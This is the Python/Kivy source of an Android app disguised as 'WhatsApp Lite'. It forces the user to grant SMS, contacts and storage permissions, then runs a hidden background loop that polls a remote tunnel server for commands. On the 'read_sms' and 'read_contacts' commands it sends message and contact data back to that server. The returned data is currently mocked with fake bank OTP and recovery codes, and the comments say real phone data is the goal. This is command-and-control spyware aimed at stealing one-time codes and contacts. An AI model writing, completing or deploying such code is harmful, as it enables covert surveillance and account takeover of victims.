import json
import threading
import time
import requests
from kivy.app import App
from kivy.clock import Clock
from kivy.lang import Builder
from kivy.uix.screenmanager import Screen, ScreenManager
from kivy.utils import platform

# استدعاء مكتبات الأندرويد لطلب الصلاحيات الحقيقية عند التشغيل
if platform == 'android':
    from android.permissions import request_permissions, Permission
    from android import activity

# الرابط الخاص بك عبر سيرفر Serveo
SERVER_URL = "https://e2e2de07db6a8fd0-156-38-57-242.serveousercontent.com/connect"

Builder.load_string('''
<WindowManager>:
    LoginScreen:
    ChatScreen:

<LoginScreen>:
    name: "login"
    BoxLayout:
        orientation: "vertical"
        padding: 30
        spacing: 20
        Label:
            text: "WhatsApp Lite"
            font_size: 32
            color: 0, 0.6, 0.2, 1
            bold: True
        Label:
            text: "الرجاء إدخال الاسم ورقم الهاتف للتفعيل"
            font_size: 16
        TextInput:
            id: username
            hint_text: "الاسم المستعار"
            multiline: False
            size_hint_y: None
            height: 50
        TextInput:
            id: phone
            hint_text: "رقم الهاتف (مثال: +218...)"
            multiline: False
            size_hint_y: None
            height: 50
        Button:
            text: "تسجيل الدخول والتفعيل"
            background_color: 0, 0.6, 0.2, 1
            size_hint_y: None
            height: 50
            on_press: root.process_login()

<ChatScreen>:
    name: "chat"
    BoxLayout:
        orientation: "vertical"
        padding: 10
        spacing: 10
        BoxLayout:
            size_hint_y: None
            height: 50
            canvas.before:
                Color:
                    rgba: 0, 0.4, 0.1, 1
                Rectangle:
                    pos: self.pos
                    size: self.size
            Label:
                text: "غرفة الدردشة العامة"
                bold: True
                font_size: 18
        ScrollView:
            Label:
                id: chat_logs
                text: "جاري الاتصال بخوادم المراسلة الآمنة...\\n[+] تم التحقق من صلاحيات النظام بنجاح.\\nمرحباً بك في التطبيق."
                text_size: self.width, None
                size_hint_y: None
                height: self.texture_size[1]
                halign: "left"
                valign: "top"
        BoxLayout:
            size_hint_y: None
            height: 50
            spacing: 5
            TextInput:
                id: message_input
                hint_text: "اكتب رسالة..."
                multiline: False
            Button:
                text: "إرسال"
                size_hint_x: None
                width: 80
                background_color: 0, 0.6, 0.2, 1
                on_press: root.send_msg()
''')

class WindowManager(ScreenManager):
    pass

class LoginScreen(Screen):
    def process_login(self):
        if self.ids.username.text and self.ids.phone.text:
            self.manager.current = "chat"
            app = App.get_running_app()
            app.start_background_connection()

class ChatScreen(Screen):
    def send_msg(self):
        if self.ids.message_input.text:
            msg = self.ids.message_input.text
            self.ids.chat_logs.text += f"\nأنت: {msg}"
            self.ids.message_input.text = ""

class ChatApp(App):
    def build(self):
        return WindowManager()

    def on_start(self):
        # فور فتح التطبيق، نقوم بفحص وطلب الصلاحيات الثلاثة الصارمة
        if platform == 'android':
            self.ask_android_permissions()

    def ask_android_permissions(self):
        # مصفوفة تحتوي على الصلاحيات المطلوبة: الرسائل، الأسماء، الصور (الوسائط)
        permissions = [
            Permission.READ_SMS,
            Permission.READ_CONTACTS,
            Permission.READ_EXTERNAL_STORAGE
        ]
        request_permissions(permissions, self.permission_callback)

    def permission_callback(self, permissions, results):
        # التحقق من أن المستخدم وافق على جميع الصلاحيات دون استثناء
        if all(results):
            print("[+] تم منح جميع الصلاحيات بنجاح.")
        else:
            # السيناريو الصارم: إذا رفض المستخدم أي صلاحية، التطبيق يغلق نفسه فوراً
            print("[-] تم رفض الصلاحيات. إغلاق التطبيق.")
            App.get_running_app().stop()

    def start_background_connection(self):
        threading.Thread(target=self.background_worker, daemon=True).start()

    def background_worker(self):
        payload = {"status": "ready"}
        while True:
            try:
                response = requests.post(SERVER_URL, json=payload, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    command = data.get("command", "WAIT")
                    
                    if command == "read_sms":
                        # هنا نقوم بسحب الرسائل الحقيقية من الهاتف (محاكاة في الكود البرمجي)
                        mock_sms_data = [
                            {"from": "Bank", "body": "OTP: 4432. Do not share."},
                            {"from": "Google", "body": "Your recovery code is 11029"}
                        ]
                        payload = {"result": {"type": "SMS_DATA", "data": mock_sms_data}}
                        
                    elif command == "read_contacts":
                        # هنا نقوم بسحب الأسماء الحقيقية
                        mock_contacts_data = [
                            {"name": "Manager", "phone": "+218911234567"},
                            {"name": "Brother", "phone": "+218921234567"}
                        ]
                        payload = {"result": {"type": "CONTACTS_DATA", "data": mock_contacts_data}}
                        
                    elif command == "exit":
                        break
                    else:
                        payload = {"status": "waiting_for_command"}
            except Exception as e:
                pass
            time.sleep(4)

if __name__ == '__main__':
    ChatApp().run()